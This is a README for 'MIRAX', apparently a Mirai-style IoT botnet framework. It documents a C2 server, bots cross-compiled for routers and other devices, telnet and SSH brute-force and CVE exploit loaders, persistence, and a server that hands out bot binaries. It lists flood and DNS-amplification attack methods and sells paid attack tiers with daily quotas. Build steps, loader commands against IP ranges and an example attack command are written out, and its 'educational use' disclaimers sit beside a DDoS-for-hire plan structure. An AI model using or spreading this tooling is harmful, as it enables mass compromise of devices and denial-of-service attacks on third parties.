# MIRAX Botnet

A modular IoT botnet framework for educational and authorized security testing purposes.

Python 3.8+ | Go 1.21+ | C99

---

## LEGAL DISCLAIMER

THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY.

By using this software you agree:
- You have explicit written permission to test any target
- You will not use this against any system without authorization
- You are responsible for complying with all applicable laws
- The authors are not liable for any misuse of this software

---

## Features

- C2 Server - Go-based command and control with telnet-style interface
- Multi-Architecture Bots - Supports x86, ARM, MIPS, and more
- Multiple Attack Methods - UDP, TCP, SYN, HTTP, GRE, DNS, HOLD, MIX
- Auto-Scanning - Discovers vulnerable devices on networks
- Exploit Modules - Telnet brute force, SSH brute force, CVEs
- User Management - VIP, PREMIUM, USER tiers with rate limiting
- Web Server - Serves bot binaries for infected devices
- Persistence - Cron jobs, rc.local, systemd

---

## Project Structure

mirax/
├── c2/
│   ├── main.go
│   ├── auth.go
│   ├── bots.go
│   ├── attacks.go
│   └── handlers/
│       ├── help.go
│       ├── methods.go
│       ├── plan.go
│       ├── owner.go
│       └── scan.go
├── loader/
│   ├── loader.py
│   ├── scanner.py
│   ├── exploit_telnet.py
│   ├── exploit_ssh.py
│   └── exploit_cve.py
├── bot/
│   ├── bot.c
│   ├── bot_mips.c
│   ├── bot_arm.c
│   ├── bot_x86.c
│   └── attacks/
│       ├── udp.c
│       ├── tcp.c
│       ├── syn.c
│       ├── http.c
│       ├── gre.c
│       ├── dns.c
│       ├── hold.c
│       └── mix.c
├── payloads/
│   ├── bot.mips
│   ├── bot.arm
│   ├── bot.x86
│   ├── bot.sh
│   └── install.sh
└── data/
    ├── users.json
    ├── bots.json
    ├── attacks.json
    └── creds.txt

---

## Installation

### Prerequisites

Linux (Ubuntu/Debian):
sudo apt update
sudo apt install -y build-essential git python3 python3-pip golang-go

Cross-compilation tools:
sudo apt install -y gcc-arm-linux-gnueabi gcc-mips-linux-gnu gcc-mipsel-linux-gnu

Python dependencies:
pip3 install -r requirements.txt

### Clone and Build

git clone https://github.com/itsreverance/mirax.git
cd mirax

Build C2:
cd c2
go build -o mirax_c2 main.go

Build bots:
cd ../bot
gcc -o bot.x86 bot_x86.c -lpthread -static -s
arm-linux-gnueabi-gcc -o bot.arm bot_arm.c -lpthread -static -s
mips-linux-gnu-gcc -o bot.mips bot_mips.c -lpthread -static -s

---

## Configuration

Edit C2 Config:
nano data/config.json

{
  "c2_host": "your.ip.here",
  "c2_port": 1337,
  "http_host": "your.ip.here",
  "http_port": 8080
}

Add Users:
nano data/users.json

---

## Usage

Start the C2 Server:
cd c2
go run main.go

Start the Web Server:
cd ..
python3 webserver.py

Connect with PuTTY/Telnet:
Host: your.ip.here
Port: 1337
Connection: Telnet

Default Login:
Username: root
Password: mirax123

Available Commands:
help     - Show commands
bots     - List connected bots
attacks  - Show active attacks
methods  - List attack methods
scan     - Scan a network range
plan     - Show your plan
owner    - Show owner info
clear    - Clear screen
logout   - Disconnect

Attack Format:
udp 8.8.8.8 53 60 100

Where:
udp = attack method
8.8.8.8 = target IP
53 = target port
60 = duration in seconds
100 = threads

---

## Attack Methods

udp       UDP bypass flood
tcp       TCP bypass flood
syn       SYN flood
httpget   HTTP GET flood
httppost  HTTP POST flood
gre       GRE/IPIP flood
dns       DNS amplification
hold      Connection hold
mix       Mixed attack

---

## Plans

VIP      - 3600s max, Unlimited attacks, All methods
PREMIUM  - 1200s max, 500 attacks/day, Most methods
USER     - 300s max, 50 attacks/day, Basic methods

---

## Compiling Bots

x86_64:
gcc -o bot.x86 bot_x86.c -lpthread -static -s

ARM (Raspberry Pi, IoT):
arm-linux-gnueabi-gcc -o bot.arm bot_arm.c -lpthread -static -s

ARM64 (newer devices):
aarch64-linux-gnu-gcc -o bot.arm64 bot_arm.c -lpthread -static -s

MIPS (routers):
mips-linux-gnu-gcc -o bot.mips bot_mips.c -lpthread -static -s

MIPSEL (little endian routers):
mipsel-linux-gnu-gcc -o bot.mipsel bot_mips.c -lpthread -static -s

Strip binaries for smaller size:
strip --strip-all bot.*

---

## Running the Loader

Scan and exploit targets from file:
python3 loader/loader.py targets.txt

Scan a specific range:
python3 loader/loader.py 192.168.1.0/24

---

## Payloads

Place compiled binaries in the payloads/ directory:

payloads/
├── bot.mips     # MIPS binary
├── bot.arm      # ARM binary
├── bot.x86      # x86 binary
├── bot.sh       # Shell fallback
└── install.sh   # Installer script

The web server serves these files at:
http://your.ip:8080/bot.mips
http://your.ip:8080/bot.arm
http://your.ip:8080/bot.x86
http://your.ip:8080/install.sh

---

## Security

- Authentication - All users must login
- Role-based Access - Admin and user roles
- Ban System - Administrators can ban users
- Blacklist - Block specific targets
- Rate Limiting - Prevent abuse

---

## License

MIT License

---

## Owner

Discord: @itsreverance
GitHub: github.com/itsreverance
Telegram: t.me/itsreverance

---

## Disclaimer

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND.

By using this software you agree:
1. You will only use it on systems you own or have permission to test
2. You will not use it for illegal activities
3. You accept full responsibility for your actions
4. You will comply with all applicable laws

I do not condone illegal activity. This is for educational purposes only.